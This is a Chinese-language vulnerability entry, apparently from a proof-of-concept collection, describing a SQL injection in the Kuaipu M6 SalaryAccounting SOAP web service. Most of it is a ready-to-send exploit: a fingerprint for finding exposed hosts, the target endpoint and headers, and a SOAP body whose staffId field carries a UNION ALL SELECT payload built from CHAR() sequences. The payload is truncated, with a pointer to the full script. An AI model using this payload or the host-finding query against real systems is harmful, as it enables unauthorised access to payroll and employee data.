# 快普M6SalaryAccounting存在SQL注入漏洞

- **系统**：快普　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="Resource/JavaScript/jKPM6.DateTime.js"`
- **请求**：`POST /WebService/HR/Salary/SalaryAccounting.asmx HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=ecch4oew21q5s0d51waneyy4; http125331972318088ValidateCode=R3QT…`　`SOAPAction: http://tempuri.org/Calculate`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 1112`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:Calculate>
<!--type: string-->
<tem:SalaryCategory></tem:SalaryCategory>
<!--type: string-->
<tem:StaffBirthDay></tem:StaffBirthDay>
<!--type: string-->
<tem:staffId>
1) UNION ALL SELECT CHAR(113)+CHAR(98)+CHAR(98)+CHAR(113)+CHAR(113)+CHAR(79)+CHAR(70)+CHAR(108)+CHAR(70)+CHAR(75)+CHAR(107)+CHAR(66)+CHAR(112)+CHAR(72)+CHAR(110)+CHAR(75)+CHAR(98)+CHAR(74)+CHAR(67)+CHAR(79)+CHAR(115)+CHAR(108)+CHAR(67)+CHAR(75)+CHAR(98)+CHAR(68)+CHAR(100)+CHAR(84)+CHAR…（脚本共 2133 字，完整版见原文）
```

**其他**
- 快普M6 SalaryAccounting存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 快普M6